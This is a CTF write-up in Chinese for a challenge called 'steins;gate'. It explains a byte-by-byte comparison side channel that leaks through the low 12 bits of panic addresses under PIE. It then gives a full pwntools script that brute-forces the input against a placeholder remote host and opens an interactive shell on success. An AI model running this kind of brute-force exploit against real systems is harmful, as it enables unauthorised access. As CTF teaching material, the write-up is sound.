# steins;gate

## 题目简述

题面是入侵 SERN 服务器并寻找最高机密文件，附件是一个会根据输入逐字节比较并在错误位置触发 panic 的程序。题目的重要环境特征是开启 PIE，但 panic 地址仍会暴露页内低 12 位偏移；不同输入前缀导致的崩溃位置不同，形成可观测的比较进度侧信道。

## 解题过程

这题更接近侧信道题。程序逐字节比较输入，错误位置不同会导致 `panic` 的回溯地址不同。虽然程序开启 PIE，但地址的页内偏移不会随 ASLR 改变，所以只看崩溃地址最后 12 bit，就能判断当前猜测是否推进到了下一字节。

利用时维护一个已知前缀，从第一个未知字节开始枚举 `0x00` 到 `0xff`。如果当前猜测仍在同一位置失败，回溯地址低 12 bit 会等于该位置对应的固定偏移；如果偏移变化，说明该字节猜对了，程序已经比较到后续位置。脚本应保存进度并在远程断开后重连，避免长时间爆破时丢失结果。

```python
from pwn import *
import re
import os
import time

context(arch='amd64', os='linux', log_level='info')
PROGRESS_FILE = "progress.hex"
TOTAL_BYTES = 64
URL = "<challenge-host>"
PORT = 0

def get_panic_suffix(index):
    base = 0x4b7
    step = 0x26
    return (base + index * step) & 0xfff

def load_progress():
    if os.path.exists(PROGRESS_FILE):
        with open(PROGRESS_FILE, "r") as f:
            data = f.read().strip()
            if len(data) != TOTAL_BYTES * 2:
                raise ValueError("")
            return data
    else:
        data = "00" * TOTAL_BYTES
        with open(PROGRESS_FILE, "w") as f:
            f.write(data)
        return data

def save_progress(flag_hex):
    with open(PROGRESS_FILE, "w") as f:
        f.write(flag_hex)
        f.flush()
        os.fsync(f.fileno())

def solve():
    flag_hex = load_progress()
    start_idx = next(
        (i for i in range(TOTAL_BYTES) if flag_hex[i*2:i*2+2] == "00"),
        None
    )
    if start_idx is None:
        print(f"[*] Final Hex: {flag_hex}")
        print(f"[*] Final Str: {bytes.fromhex(flag_hex)}")
        return

    print(f"[*] 从第 {start_idx} 字节开始继续爆破")
    p = remote(URL, PORT)
    p.recvuntil(b":\n")

    for idx in range(start_idx, TOTAL_BYTES):
        bad_suffix_str = f"{get_panic_suffix(idx):03x}"
        found_byte = False
        retry = 0
        while not found_byte:
            retry += 1
            log.info(f"[*] Byte {idx} retry round {retry}")
            prev_guess_hex = None

            for b in range(256):
                guess_hex = f"{b:02x}"
                payload_hex = (
                    flag_hex[:idx*2] +
                    guess_hex +
                    "00" * (TOTAL_BYTES - idx - 1)
                )
                payload_bytes = payload_hex.encode()
                try:
                    p.sendline(payload_bytes)
                    output = p.recvuntil([b"verify", b"/bin/sh"], timeout=5)
                    if b"/bin/sh" in output:
                        # shell was triggered by the previous payload
                        use_hex = prev_guess_hex or guess_hex
                        print(f"\n[+] Last byte {idx} found (got shell): {use_hex}")
                        flag_hex = (
                            flag_hex[:idx*2] +
                            use_hex +
                            flag_hex[idx*2+2:]
                        )
                        save_progress(flag_hex)
                        print(f"\n[*] Final Hex: {flag_hex}")
                        print(f"[*] Final Str: {bytes.fromhex(flag_hex)}")
                        p.interactive()
                        return
                    output = output.decode('utf-8', errors='ignore')
                    # drain remaining backtrace + next prompt
                    p.recvuntil(b":\n", timeout=5)
                    matches = re.findall(
                        r"(0x[0-9a-fA-F]+)\s+-\s+.*verify",
                        output
                    )
                    if matches:
                        panic_addr_str = matches[0]
                        current_suffix = panic_addr_str[-3:]
                        if current_suffix == bad_suffix_str:
                            prev_guess_hex = guess_hex
                            continue

                        print(f"\n[+] Byte {idx} found: {guess_hex}")
                        print(f"    expect: ...{bad_suffix_str}, got: ...{current_suffix}")
                        flag_hex = (
                            flag_hex[:idx*2] +
                            guess_hex +
                            flag_hex[idx*2+2:]
                        )
                        save_progress(flag_hex)
                        found_byte = True
                        break
                except Exception as e:
                    log.warning(f"Exception: {e}, reconnecting...")
                    try:
                        p.close()
                    except:
                        pass
                    p = remote(URL, PORT)
                    p.recvuntil(b":\n")
                    break
            if not found_byte and retry > 1:
                log.info(f"[*] Byte {idx} retrying...")
                time.sleep(0.01)
    p.close()
    print(f"\n[*] Final Hex: {flag_hex}")
    print(f"[*] Final Str: {bytes.fromhex(flag_hex)}")
if __name__ == "__main__":
    solve()
```

## 方法总结

当程序逐字节比较并在错误处崩溃、panic 或打印地址时，要注意崩溃地址本身可能泄露比较进度。PIE 只能随机化页基址，页内偏移仍稳定；爆破脚本应尽量复用连接、设置超时并记录已知前缀，避免远程不稳定导致误判。
